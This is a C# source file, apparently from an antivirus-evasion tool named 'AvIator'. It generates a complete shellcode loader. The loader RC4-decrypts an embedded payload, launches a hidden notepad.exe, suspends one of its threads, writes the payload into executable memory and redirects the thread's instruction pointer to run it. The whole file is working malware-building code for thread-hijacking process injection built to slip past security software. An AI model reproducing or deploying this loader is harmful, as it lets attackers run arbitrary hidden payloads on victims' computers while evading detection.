using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AvIator
{
    class ThreadHijackingX86
    {
        String code;

        public ThreadHijackingX86(String decKey, String encPayload, String proc)
        {
            code = @"using System;
  
                        using System.Collections.Generic;
                        using System.Diagnostics;
                        using System.Linq;
                        using System.Runtime.ConstrainedExecution;
                        using System.Runtime.InteropServices;
                        using System.Security;
                        using System.Text;
                        using System.Threading.Tasks;

                       namespace Loader
                       {
                        static class Decryptor
                        {
                            public static byte[] Decrypt(byte[] key, byte[] data)
                            {
                                return EncryptOutput(key, data).ToArray();
                            }
                            private static byte[] EncryptInitalize(byte[] key)
                            {
                                byte[] s = Enumerable.Range(0, 256)
                                  .Select(i => (byte)i)
                                  .ToArray();

                                for (int i = 0, j = 0; i < 256; i++)
                                {
                                    j = (j + key[i % key.Length] + s[i]) & 255;

                                    Swap(s, i, j);
                                }

                                return s;
                            }
                            private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
                            {
                                byte[] s = EncryptInitalize(key);

                                int i = 0;
                                int j = 0;

                                return data.Select((b) =>
                                {
                                    i = (i + 1) & 255;
                                    j = (j + s[i]) & 255;

                                    Swap(s, i, j);

                                    return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                                });
                            }
                            private static void Swap(byte[] s, int i, int j)
                            {
                                byte c = s[i];

                                s[i] = s[j];
                                s[j] = c;
                            }

                        }
                            public static class InjectShellcode
    {

        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        public enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }
        public struct THREADENTRY32
        {

            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ThreadID;
            internal UInt32 th32OwnerProcessID;
            internal UInt32 tpBasePri;
            internal UInt32 tpDeltaPri;
            internal UInt32 dwFlags;
        }
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_ALL_ACCESS = 0x001F03FF
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value 
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS 
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT 
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS 
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER 
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL 
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        // Next x64

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format(""High: { 0}, Low: { 1}"", this.High, this.Low);
            }
    }

    /// <summary>
    /// x64
    /// </summary>
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct XSAVE_FORMAT64
    {
        public ushort ControlWord;
        public ushort StatusWord;
        public byte TagWord;
        public byte Reserved1;
        public ushort ErrorOpcode;
        public uint ErrorOffset;
        public ushort ErrorSelector;
        public ushort Reserved2;
        public uint DataOffset;
        public ushort DataSelector;
        public ushort Reserved3;
        public uint MxCsr;
        public uint MxCsr_Mask;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public M128A[] FloatRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public M128A[] XmmRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
        public byte[] Reserved4;
    }

    /// <summary>
    /// x64
    /// </summary>
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;

        public CONTEXT_FLAGS ContextFlags;
        public uint MxCsr;

        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;

        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;

        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;

        public XSAVE_FORMAT64 DUMMYUNIONNAME;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
        public M128A[] VectorRegister;
        public ulong VectorControl;

        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }

    public enum FreeType
    {
        Decommit = 0x4000,
        Release = 0x8000,
    }
    //Required Windows APIs
    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);

    [DllImport(""kernel32.dll"")]
    public static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

    [DllImport(""kernel32.dll"")]
    public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern int SuspendThread(IntPtr hThread);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport(""kernel32.dll"")]
    public static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool Wow64GetThreadContext(IntPtr thread, ref CONTEXT64 lpcontext);

    // Get context of thread x64, in x64 application
    [DllImport(""kernel32.dll"", SetLastError = true)]
   public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
   public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, AllocationType dwFreeType);

    [DllImport(""kernel32.dll"", SetLastError = true)]
   public static extern uint ResumeThread(IntPtr hThread);

    [DllImport(""ntdll.dll"", SetLastError = true)]
    public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

}

                                    class Program
                                    {


                                        static void Main(string[] args)
                                        {

                                            bool x64;
                                            InjectShellcode.THREADENTRY32 thr32 = new InjectShellcode.THREADENTRY32();
                                            InjectShellcode.CONTEXT context = new InjectShellcode.CONTEXT();

                                                Process p = new Process();
                                                p.StartInfo = new ProcessStartInfo(""" + "notepad.exe" + @""");
                                            
                                                p.StartInfo.CreateNoWindow = true;

                                                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                                p.Start();
                                                Int32 processId = p.Id;

                                            IntPtr processHandle, snapshotHandle, ptrToMemoryAlloc, hthread;
                                       
                                      


                                            processHandle = InjectShellcode.OpenProcess(InjectShellcode.ProcessAccessFlags.All, false, processId);

                                            if (processHandle==IntPtr.Zero)                            
                                                System.Environment.Exit(1);



                                           snapshotHandle = InjectShellcode.CreateToolhelp32Snapshot(InjectShellcode.SnapshotFlags.Thread, 0);     
                                            thr32.dwSize =(uint)Marshal.SizeOf(thr32);
                                            x64 = InjectShellcode.Thread32First(snapshotHandle, ref thr32);  

                                            while (InjectShellcode.Thread32Next(snapshotHandle, ref thr32))
                                                if (thr32.th32OwnerProcessID == processId)
                                                    break;
                                            InjectShellcode.CloseHandle(snapshotHandle);

                                            ptrToMemoryAlloc = InjectShellcode.VirtualAllocEx(processHandle, IntPtr.Zero, 4096, InjectShellcode.AllocationType.Commit | InjectShellcode.AllocationType.Reserve, InjectShellcode.MemoryProtection.ExecuteReadWrite);

                                            if (ptrToMemoryAlloc == IntPtr.Zero)
                                            {
                                                InjectShellcode.CloseHandle(processHandle);
                                                System.Environment.Exit(1);
                                            }

                                            hthread = InjectShellcode.OpenThread(InjectShellcode.ThreadAccess.THREAD_ALL_ACCESS, false, thr32.th32ThreadID);

                                            if (hthread == IntPtr.Zero)
                                            {
                                                InjectShellcode.VirtualFreeEx(processHandle, ptrToMemoryAlloc, 0, InjectShellcode.AllocationType.Release);
                                                InjectShellcode.CloseHandle(processHandle);
                                                System.Environment.Exit(1);
                                            }
                                            context.ContextFlags = (uint) InjectShellcode.CONTEXT_FLAGS.CONTEXT_ALL;

                                            int ij = InjectShellcode.SuspendThread(hthread);
                                            if(!InjectShellcode.GetThreadContext(hthread, ref context))
                                            {
                                                InjectShellcode.ResumeThread(hthread);
                                                int j = Marshal.GetLastWin32Error();
                                                System.Environment.Exit(1);
                                            }


                                            String Payload_Encrypted = """ + encPayload + @""";
                                            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
                                            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
                                            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
                                            {
                                                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                                                _X_to_Bytes[i] = current;
                                            }
                                            byte[] KEY = {" + decKey + @"};
                                            byte[] Final_Payload = Decryptor.Decrypt(KEY, _X_to_Bytes);
                                           
                                            IntPtr thrId;

                                                if (!InjectShellcode.WriteProcessMemory(processHandle, ptrToMemoryAlloc, Final_Payload, Final_Payload.Length, out thrId))
                                                {
                                                    InjectShellcode.ResumeThread(hthread);
                                                    InjectShellcode.CloseHandle(processHandle);
                                                    System.Environment.Exit(1);

                                                }
                                                  context.Eip = (uint) ptrToMemoryAlloc.ToInt32();

                                                if(!InjectShellcode.SetThreadContext(hthread,ref context))
                                                {
                                                    InjectShellcode.ResumeThread(hthread);
                                                    InjectShellcode.CloseHandle(processHandle);
                                                    System.Environment.Exit(1);
                                                }
                                                int k = Marshal.GetLastWin32Error();

                                                InjectShellcode.ResumeThread(hthread);
                                                InjectShellcode.CloseHandle(hthread);
                                                InjectShellcode.CloseHandle(processHandle);


                                            }

                                        }
   
                                }";


        }
        public String GetCode()
        {
            return code;
        }
    }
}
